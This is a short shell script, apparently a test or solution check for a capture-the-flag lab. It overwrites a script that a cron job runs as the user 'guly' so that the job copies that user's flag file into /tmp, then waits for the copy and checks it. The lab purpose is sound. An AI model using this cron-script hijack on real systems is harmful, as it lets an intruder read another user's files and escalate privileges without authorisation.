set -eu
rm -f /tmp/guly-root
cat > /home/guly/pivot.sh <<'EOF'
#!/bin/sh
cat /home/guly/user.txt > /tmp/guly-flag
EOF
for _ in 1 2 3 4 5 6 7 8 9 10; do
    [ -s /tmp/guly-flag ] && break
    sleep 1
done
out=$(cat /tmp/guly-flag 2>/dev/null || true)
echo "$out"
echo "$out" | grep -q 'FLAG{user-guly}' || { echo "cron pivot did not run as guly" >&2; exit 1; }
